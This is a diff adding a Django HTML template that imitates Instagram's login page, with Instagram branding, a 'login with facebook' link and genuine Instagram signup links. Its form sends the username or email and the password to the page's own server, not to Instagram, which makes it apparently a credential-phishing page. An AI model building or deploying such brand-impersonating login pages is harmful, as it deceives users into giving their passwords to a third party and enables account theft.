@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+	 <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+	<title>Login.instagram</title>
+	<style>
+		
+		button
+		{
+			border-radius:5px; 
+		}
+		*
+		{
+			box-sizi: border-box;
+		}
+		body
+		{
+
+			margin: 0 0 10px;
+			padding: 10px 0;
+		}
+		
+		
+		input[type=text],input[type=password]
+		{
+			width: 20%;
+			background-color:white;
+			display: inline-block;
+			box-sizing: border-box;
+			border:1px solid silver;
+			border border-radius: 2px;
+			padding : 10px;  
+		}
+		
+		button
+		{
+			width: 20%;
+			background-color:lightblue;
+			float: center;
+			padding: 10px 10px; margin: 10px;
+			opacity: 0.5;
+
+		}
+		button:hover
+		{
+			background-color: none;
+		}
+		div
+		{
+			background-color: white;
+			padding: 15px 10px;
+			border: 2px;
+			border-color: pink;
+			border-size:5px; 
+
+		}
+		.imgc
+		{
+			text-align: center;
+			
+
+		}
+		img
+		{
+			text-align: center;
+			padding:  0px 0px 0px 25px;
+		}
+	
+		.bod
+		{
+			border:1px;
+			
+			
+			
+			border-width: 11px
+			border-color: black;
+			border-radius: 1px;
+			margin:0 0 10px;
+			margin-top: 1px;
+			text-align: center; 
+			padding:10px;
+			border-spacing: 2px; 
+			
+		}
+		.bod1
+		{
+			border: 1px ;
+			
+			text-align: center;
+			font: inherit;
+			
+		}
+		a
+		{
+			color: blue;
+			font-size: 50px;
+			font-family: normal;
+			text-decoration:none; 
+			font: inherit;
+
+
+		}
+	</style>
+	<link rel="icon" type="image/x-icon" href="123.jpg">
+		<body class=container style="border: 10px silver;">
+
+			<div>
+				
+			</div>
+		<div class="bod">
+			<form action="/" method="post">
+				 {% csrf_token %}
+<div class="imgc"  >
+
+				<img src="/static/ins.jpg"    width="20%" height="20%"><br>
+</div>
+<div>
+<input type="text" name="email" placeholder="phonenumber,email or username"><br><br>
+
+<input type="password" name="pass" placeholder="password"><br><br>
+
+<button type="submit">SUBMIT</button><br>
+
+<p style="opacity: 0.5">_______________  or  _______________</p><br>
+<img src="/static/fb.png" height="19px" width="19px">   <a href="https://www.facebook.com/login/" style="color: darkblue;">login with facebook </a>
+<br>
+<p >  Forget password?</p>
+
+
+</div>
+<div class="bod1">
+	<p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en" style="color: darkblue;">Signup</a></p><br>
+	<p>Get the app</p><br>
+	<img src="/static/google.png" height="9%" width="9%"><img src="/static/apple.png" width="9%" height="9%">
+</div>
+
+	</form>
+
+</body>
+</html>
